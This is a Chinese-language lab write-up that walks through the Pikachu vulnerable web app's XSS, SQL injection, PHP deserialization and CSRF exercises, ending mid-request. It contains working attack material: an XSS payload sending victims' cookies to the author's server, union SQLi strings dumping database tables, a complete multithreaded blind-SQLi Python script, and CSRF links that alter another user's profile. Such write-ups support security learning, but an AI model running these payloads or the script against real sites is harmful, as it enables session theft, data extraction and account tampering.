<p>再看题目这边, 随便输入一个<code>123</code>, 我们看到生成了一个超链接, 指向<code>http://ipadd/pikachu/vul/xss/123</code>, 也就是我们输入的内容会成为链接末尾的部分.</p>
<p>包含超链接的<code>div元素</code>的代码如下.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"dom"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">        123</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">        "</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里生成div元素是通过js方法<code>domxss()</code>实现的.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">"text"</span>).value;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"dom"</span>).innerHTML = <span class="string">"&lt;a href='"</span>+str+<span class="string">"'&gt;what do you see?&lt;/a&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//试试：'&gt;&lt;img src="#" onmouseover="alert('xss')"&gt;</span></span><br><span class="line"><span class="comment">//试试：' onclick="alert('xss')"&gt;,闭合掉就行</span></span><br></pre></td></tr></table></figure>

<p>这里作者已经给了我们提示了, 我们需要闭合原语句来构造我们的payload.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">'&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onmouseover</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">var img = new Image();</span></span></span><br><span class="line"><span class="tag"><span class="string">img.src = 'http://ipadd/myxss/index.php?cookie=' + document.cookie;</span></span></span><br><span class="line"><span class="tag"><span class="string">document.body.append(img);"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将这段代码提交后, 我们看生成的<div></div></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onmouseover</span>=<span class="string">" var img = new Image(); img.src = 'http://ipadd/myxss/index.php?cookie=' + document.cookie; document.body.append(img);"</span>&gt;</span></span><br><span class="line">        "'what do you see?"</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当鼠标经过图片时, 我的服务器上就已经获取了用户的cookie.</p>
<h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><p>当提交后, 会产生第一个链接, 点击后会调用下面的方法(已经加入注释)生成第二个链接.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> str = <span class="built_in">window</span>.location.search;  <span class="comment">//获取url中的GET参数</span></span><br><span class="line"><span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.split(<span class="string">"text="</span>)[<span class="number">1</span>]); <span class="comment">//将str中的"text="删去</span></span><br><span class="line"><span class="keyword">var</span> xss = txss.replace(<span class="regexp">/\+/g</span>,<span class="string">' '</span>);   <span class="comment">//将txss中的 '+' 替换为 ' '</span></span><br><span class="line"><span class="comment">//alert(xss);</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"dom"</span>).innerHTML = <span class="string">"&lt;a href='"</span>+xss+<span class="string">"'&gt;就让往事都随风,都随风吧&lt;/a&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//试试：'&gt;&lt;img src="#" onmouseover="alert('xss')"&gt;</span></span><br><span class="line"><span class="comment">//试试：' onclick="alert('xss')"&gt;,闭合掉就行</span></span><br><span class="line"><span class="string">``</span><span class="string">`         </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">总之就是把我们输入的文本(此处成了参数)提取出来了.</span></span><br><span class="line"><span class="string">后面的都差不多</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### xss之盲打</span></span><br><span class="line"><span class="string">提交的留言会直接显示在后台中.</span></span><br><span class="line"><span class="string">虽然我们(用户)看不到, 但是管理员可以看到, 这是针对后台管理员的攻击.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### xss之过滤</span></span><br><span class="line"><span class="string">题目使用了正则表达式过滤,</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>php</span><br><span class="line">$message=preg_replace(<span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/'</span>, <span class="string">''</span>, $_GET[<span class="string">'message'</span>]);</span><br></pre></td></tr></table></figure>

<p>使用下面的绕过.<br><img src="0" onclick="alert(1)"></p>
<h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>因为输入框的数字被限定在了1-6, 所以需要抓包改数据. 最好使用<code>burp suite</code>的 <code>Repeater</code>功能来多次发送payload.<br>可以令<code>id=1 or 1</code>, 这样所有的where 子句布尔值都为真, 可以遍历出, 所有的数据.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hello,vince  </span><br><span class="line">your email is: vince@pikachu.com  </span><br><span class="line">hello,allen   </span><br><span class="line">your email is: allen@pikachu.com  </span><br><span class="line">hello,kobe   </span><br><span class="line">your email is: kobe@pikachu.com  </span><br><span class="line">hello,grady   </span><br><span class="line">your email is: grady@pikachu.com  </span><br><span class="line">hello,kevin  </span><br><span class="line">your email is: kevin@pikachu.com  </span><br><span class="line">hello,lucy  </span><br><span class="line">your email is: lucy@pikachu.com  </span><br><span class="line">hello,lili  </span><br><span class="line">your email is: lili@pikachu.com</span><br></pre></td></tr></table></figure>

<p>如果题目的mysql查询语句后加上<code>LIMIT 0,1</code>或你想爆出数据库更多的数据就不会这么简单了, 可以用我之间的<a href="http://tjuyjn.top/2019/07/11/sqli-lab%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/">sqli-lab</a>里总结的方法, 如下:</p>
<ol>
<li>令<code>id=2-1</code>, 发现和<code>id=1</code>时相同, 确定这是数字型.</li>
<li>令<code>id=0</code>, 查询结果集为空.</li>
<li>令<code>id=0 union select 1,2</code>, 查询结果为<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello, 1  </span><br><span class="line">your email is:2</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>这表明结果集为两列.</p>
<ul>
<li>令<code>id=0 union select database(),(select group_concat(schema_name) from information_schema.schemata)--+</code><br>结果为(无关数据已打码)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello,pikachu </span><br><span class="line">your email is: information_schema,xxxxx,mysql,performance_schema,xxxx,pikachu,xxxxxxxxx...</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这样就获得了题目使用的数据库和所有数据库</p>
<ol start="4">
<li>令<code>id=0 union select 2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;pikachu&#39;)--+</code>, 结果为:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello,2</span><br><span class="line">your email is: httpinfo,member,message,users,xssblind</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>这样得到了该数据库的表名.</p>
<ol start="5">
<li>令<code>id=0 union select 2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;member&#39;)--+</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your email is: id,username,pw,sex,phonenum,address,email</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>得到<code>users</code>的所有列名.</p>
<ol start="6">
<li>令<code>id=0 union select (select group_concat(username) from pikachu.member),(select group_concat(email) from pikachu.member)--+</code>爆出<code>username</code>和<code>email</code>这两个字段.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello,vince,allen,kobe,grady,kevin,lucy,lili</span><br><span class="line">your email is: vince@pikachu.com,allen@pikachu.com,kobe@pikachu.com,grady@pikachu.com,kevin@pikachu.com,lucy@pikachu.com,lili@pikachu.com</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>和上题类似, 只是字符型需要考虑闭合.<br>这里是用<code>&#39;</code>闭合.</p>
<h3 id="搜索型注入-略"><a href="#搜索型注入-略" class="headerlink" title="搜索型注入(略)"></a>搜索型注入(略)</h3><h3 id="xx型注入-略"><a href="#xx型注入-略" class="headerlink" title="xx型注入(略)"></a>xx型注入(略)</h3><h3 id="布尔盲注-略"><a href="#布尔盲注-略" class="headerlink" title="布尔盲注(略)"></a>布尔盲注(略)</h3><p>这三个和之前的区别不大, 不赘述了.</p>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>这道题的特点是, 查询结果无论正确与否都不会显示出来.</p>
<p>所以可以使用时间盲注.</p>
<p>例如, 想要判断<code>database()</code>的文本长度, 就可以使用 payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ipadd/pikachu/vul/sqli/sqli_blind_t.php?name=1&apos; or length(database()) = 7 and sleep(3) -- &amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>

<p>会发现页面延迟了很久才加载出来.</p>
<p>这是因为我们的查询语句中有<code>sleep(3)</code>, 说明<code>length(database())=7</code>成立(否则会因为短路效应不执行<code>sleep()</code>).</p>
<p>基于这个原理, 我写了个时间盲注的python脚本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局变量, 避免使用引用传参</span></span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二分搜索</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span><span class="params">(base, top, number, flag)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> flag : <span class="comment"># 说明payload为真    </span></span><br><span class="line">        base = number+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span> : <span class="comment"># 说明 payload为假   </span></span><br><span class="line">        top = number</span><br><span class="line">    number = int((top+base)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> [base,top,number]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数字爆破</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom_num_GET</span><span class="params">(targetUrl,info,parm)</span>:</span> </span><br><span class="line">    [base,top,number] = [<span class="number">1</span>,<span class="number">100</span>,<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">'1\' or length(('</span>+ info +<span class="string">')) &gt; '</span>+str(number)+<span class="string">' and sleep(0.3) -- '</span></span><br><span class="line">        time1 = time.time()</span><br><span class="line">        requests.get(url= targetUrl + payload + parm)</span><br><span class="line">        time2 = time.time()</span><br><span class="line">        [base,top,number] = bin_search(base,top,number,time2-time1 &gt; <span class="number">1.2</span>)</span><br><span class="line">        <span class="keyword">if</span> base == top:</span><br><span class="line">            <span class="keyword">return</span> base</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符爆破</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom_chr</span><span class="params">(info,n,targetUrl,parm)</span>:</span> </span><br><span class="line">    <span class="keyword">global</span> result</span><br><span class="line">    <span class="comment"># 设置ascii码的上下限</span></span><br><span class="line">    [base,top,number] = [<span class="number">32</span>,<span class="number">126</span>,<span class="number">79</span>] </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">'1\' or ascii(substr(('</span>+ info +<span class="string">'),'</span>+str(n)+<span class="string">',1)) &gt; '</span>+str(number)+<span class="string">' and sleep(0.3) -- '</span> </span><br><span class="line">        time1 = time.time()</span><br><span class="line">        requests.get(url=targetUrl + payload + parm)</span><br><span class="line">        time2 = time.time()</span><br><span class="line">        [base,top,number] = bin_search(base,top,number,time2-time1 &gt; <span class="number">1.2</span>)</span><br><span class="line">        <span class="keyword">if</span> base == top:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    result[n<span class="number">-1</span>] = chr(base)</span><br><span class="line">    print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文本爆破                          </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom_text_GET</span><span class="params">(targetUrl,info,parm,len_of_txt)</span>:</span> </span><br><span class="line">    <span class="keyword">global</span> result</span><br><span class="line">    result = [<span class="number">0</span>]*len_of_txt</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,len_of_txt+<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 多线程</span></span><br><span class="line">        t = threading.Thread(target=boom_chr,args=(info,n,targetUrl,parm))</span><br><span class="line">        t.start()</span><br><span class="line">        <span class="comment"># 这里限制最大线程数</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span>(len(threading.enumerate()) &lt; <span class="number">9</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 确保所有线程跑完再退出去</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span>(len(threading.enumerate()) == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> result</span><br><span class="line">    url = <span class="string">'http://ipadd/pikachu/vul/sqli/sqli_blind_t.php?name='</span> <span class="comment">#url的前半段</span></span><br><span class="line">    parm = <span class="string">'&amp;submit=查询'</span> <span class="comment"># url的后半段</span></span><br><span class="line">    info = <span class="string">'load_file(\'/var/lib/mysql-files/flag\')'</span> <span class="comment"># 你要查询的东东</span></span><br><span class="line">    </span><br><span class="line">    print(<span class="string">'start...'</span>)</span><br><span class="line">    time0 = time.time()</span><br><span class="line">    len_of_database = boom_num_GET(url,info,parm)</span><br><span class="line">    print(<span class="string">"length of text is : "</span>, len_of_database)</span><br><span class="line"></span><br><span class="line">    boom_text_GET(url,info, parm, len_of_database)</span><br><span class="line">    result = <span class="string">''</span>.join(result)</span><br><span class="line">    print(<span class="string">"result is : "</span>,result)</span><br><span class="line">    print(<span class="string">"complete, cost time is "</span>, time.time() - time0)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># get 请求下的mysql时间盲注脚本</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>目前来看, 除了有点慢还是比较不错的, 有机会升级成多线程, 应该还能大幅缩短时间. </p>
<p>以后再说吧.</p>
<h4 id="2019-9-15-更新-源码已修改"><a href="#2019-9-15-更新-源码已修改" class="headerlink" title="2019/9/15 更新(源码已修改)"></a>2019/9/15 更新(源码已修改)</h4><ul>
<li>加入了我期待已久的多线程, 运行时间缩短为原先的八分之一左右</li>
</ul>
<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="知识铺垫"><a href="#知识铺垫" class="headerlink" title="知识铺垫"></a>知识铺垫</h3><ul>
<li>序列化 serialize()</li>
<li>反序列化 unserialize()</li>
<li>魔术方法: PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法. 关于魔术方法的定义我没有在网上明确的找到, 但是根据我的查阅, 类似C++中的构造函数, 拷贝赋值函数那样可以在某些特定时间自动执行的函数就是魔术方法.</li>
<li>常用的几个魔术方法:<table>
<thead>
<tr>
<th align="left">函数名</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">__construct()</td>
<td align="left">当一个对象创建时被调用</td>
</tr>
<tr>
<td align="left">__destruct()</td>
<td align="left">当一个对象销毁时被调用</td>
</tr>
<tr>
<td align="left">__toString()</td>
<td align="left">当一个对象被当作一个字符串使用</td>
</tr>
<tr>
<td align="left">__sleep()</td>
<td align="left">在对象在被序列化之前运行</td>
</tr>
<tr>
<td align="left">__wakeup</td>
<td align="left">将在序列化之后立即被调用</td>
</tr>
</tbody></table>
</li>
</ul>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>当你输入任何非序列化字符串时, 都回返回一句<code>大兄弟,来点劲爆点儿的!</code>.</p>
<p>一开始有点不明所以, 不过既然是第一次学习, 我们还是先看看题目的源码吧!</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有改动, 去除无关紧要部分的代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">"pikachu"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//O:1:"S":1:&#123;s:4:"test";s:29:"&lt;script&gt;alert('xss')&lt;/script&gt;";&#125;</span></span><br><span class="line"><span class="comment">// 上面这行是作者留下的, 其实就是题目的payload了</span></span><br><span class="line">$html=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'o'</span>]))&#123;</span><br><span class="line">    $s = $_POST[<span class="string">'o'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@$unser = unserialize($s))&#123;</span><br><span class="line">        $html.=<span class="string">"&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $html.=<span class="string">"&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">... <span class="comment">//略去无关代码</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $html;<span class="meta">?&gt;</span></span><br><span class="line">... <span class="comment">//略去无关代码</span></span><br></pre></td></tr></table></figure>

<p>我们来追溯下输入普通字符串时和payload的时候程序内部的状态:</p>
<ul>
<li><p><code>geidalaodicha</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_POST[<span class="string">'o'</span>] = <span class="string">"geidalaodicha"</span></span><br><span class="line">$s = <span class="string">"geidalaodicha"</span></span><br><span class="line">unserialize($s)无法正常执行!</span><br><span class="line">(!@$unser = unserialize($s))为真 </span><br><span class="line">进入第一个分支, $html = <span class="string">"&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;"</span></span><br><span class="line">打印 $html</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>O:1:&quot;S&quot;:1:{s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;}</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_POST[<span class="string">'o'</span>] = <span class="string">"O:1:"</span>S<span class="string">":1:&#123;s:4:"</span>test<span class="string">";s:29:"</span>&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/script&gt;<span class="string">";&#125;"</span></span><br><span class="line">$s = <span class="string">"O:1:"</span>S<span class="string">":1:&#123;s:4:"</span>test<span class="string">";s:29:"</span>&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/script&gt;<span class="string">";&#125;"</span></span><br><span class="line">unserialize($s)执行并返回$s反序列后的<span class="class"><span class="keyword">class</span> <span class="title">S</span>的实例对象</span></span><br><span class="line">进入第二个分支, $html = "&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;"</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $html;<span class="meta">?&gt;</span>  =&gt;  打印出$unser-&gt;test的值, 也就是`&lt;script ...`</span><br><span class="line">`&lt;script...` 写入html中, 在前端执行.</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>获取有人会疑惑(好吧就是我)为啥打印的不是”</p><p>{$unser-&gt;test}</p>“这段文本, 而是test的值.<p></p>
<p>这是因为</p>
<blockquote>
<p>对于可变变量使用大括号，比如：{$val}，这时候大括号就是告诉PHP，括起来的部分要当成变量处理.</p>
</blockquote>
<p>所以<code>{$unser-&gt;test}</code>直接被当成php语句解析了.</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>看了下简介, 基本已经有了思路了, 盲猜应该不难.</p>
<p>首先登录lili的账号, 尝试下修改住址为china, 然后提交.</p>
<p>用<code>burp suite</code>截取数据包.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=nan&amp;phonenum=159&amp;add=china&amp;email=123%40qq.com&amp;submit=submit HTTP/1.1</span><br><span class="line">Host: ipadd </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://ipadd/pikachu/vul/csrf/csrfget/csrf_get_edit.php</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wp-settings-time-1=1557833844; wp-settings-1=mfold%3Do; PHPSESSID=60hrtmnnsubk5ji1sr2uo8pdd0</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>提交之后发现lili的信息被修改了.</p>
<p>如果攻击kobe的账号, 可以制作payload链接.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ipadd/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=5418&amp;add=tianjin&amp;email=123%40qq.com&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>当kobe点击了这个链接后, 他的信息就被修改了. (使用另一个登录kobe账号的浏览器来模拟)</p>
<h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>和上面一样, 先登录进lili的账号, 看看是修改个人数据的数据包是长什么样子的.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">POST /pikachu/vul/csrf/csrfpost/csrf_post_edit.php HTTP/1.1</span><br><span class="line">Host: ipadd</span><br><span class="line">Content-Length: 71</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://ipadd:999</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: 